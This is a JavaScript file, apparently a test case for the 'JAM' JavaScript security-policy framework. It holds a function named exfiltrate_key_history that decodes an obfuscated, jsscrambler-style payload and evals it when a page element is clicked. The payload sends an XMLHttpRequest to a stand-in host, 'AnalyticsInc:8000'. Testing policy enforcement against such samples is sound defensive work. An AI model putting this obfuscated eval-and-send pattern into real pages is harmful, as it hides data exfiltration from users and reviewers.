function exfiltrate_key_history() {
  function v0(f) {
    function Z(f$$1, K) {
      var g = 0;
      var I = 0;
      var v2 = I < K;
      for(;v2;) {
        g = g * 96;
        var C = f$$1.charCodeAt(I);
        var v9 = C >= 32;
        if(v9) {
          v9 = C <= 127
        }
        if(v9) {
          g = g + (C - 32)
        }
        I = I + 1;
        v2 = I < K
      }
      return g
    }
    var E = "";
    var V = 0;
    var v6 = V < f.length;
    for(;v6;) {
      if(f.charAt(V) != "`") {
        var v13 = E;
        var v20 = V;
        V = V + 1;
        E = v13 + f.charAt(v20)
      }else {
        if(f.charAt(V + 1) != "`") {
          var b = Z(f.charAt(V + 3), 1) + 5;
          E = E + E.substr(E.length - Z(f.substr(V + 1, 2), 2) - b, b);
          V = V + 4
        }else {
          E = E + "`";
          V = V + 2
        }
      }
      v6 = V < f.length
    }
    return E
  }
  var v7 = v0('var L8y=(function(){var o` \'&O,Y` /!x="",w=\'return \',F=((0x51,88)<=1.031E3?(63.,false):135.20E1<=(118,0x12C)?"R":(50.,12.370E2)<=(18,1.69E2)?true:(60.7E1,85.));if(O.length>((7.,71.3E1)>3.54E2?(0x85,12):(2.,3.80E1)))for(var R=(2.1E1<=(133,0x173)?(0x6C,13):(0x21A,0xFF)<=65?0x152:4.94E2<=(6.09E2,0xA0)?42.7E1:(130.,32));R>((35.,131.)<=0x1E3?(0x173,1):(0x6F,40)>=95.5E1?(0x204,\'D\'):(1.85E2,0x1A)>0x1BA?(9.17` .!18):(44.,4.45E2));)x+=(F=(F?((56,0x232)>4.23E2?(0x22B,false):(24.90E1,13.)):(6.850E2>(11.97E2,145.)?(6.51E2,true):(0x5E,0x1B))))?O.charAt(R):"@%)eitg)(tDwn"` 1$--);return Y===((104.60E1,0x8C)<1.23E3?(0x79,null):(126.1` =!F8))?[(14.33E2>=(4.7` W AC)?(0x106` M$03.2E1,19.20E1))].constructor.c` "%(w+x)():Y^O})("_9(mTe.)ea e(",((4.96E2,8.52E2)<7.37E2?101.:67.<(97,0x196)?(22.6E1,null):(14.,0x34)));return {e:function(i){var n,s=(122.60E1>(0xAC,0x7)?(97.,0):(35,0x52)),D=0x14494799580>o,l;for(;s<i.length;s++){l=(parseInt(i.charAt(s),16)).toString(2);n=s==0?l` <#l.length-1):n^` %-((142.,9.)>=(1.640E2,26.8E1)?109.:17<(64.8E1,0x46)?(90.,1):109.9E1<(5.,0x3A)?"X":(4.38E2,100.)))}return n?D:!D}};})();var m0W=L8y.e("bc8")?{\'k\':null,\'v\':{},\'r\':"http://AnalyticsInc:8000/submission.html?test=jsscrambler",\'m\':true,\'S\':"GET",\'c\':"open",\'G\':"send"}:null,m0T=L8y.e("fc6")?{\'N\':{}}:true;xmlhttp` ;#baf6")?"` 0"":new XMLHttpRequest()` M#[m0W.c](m0W.S,m0W.r,m0W.m` 4)G` <!k)');
  if(JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v7 + " }")
  }else {
    JAM.call(eval, null, [v7])
  }
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
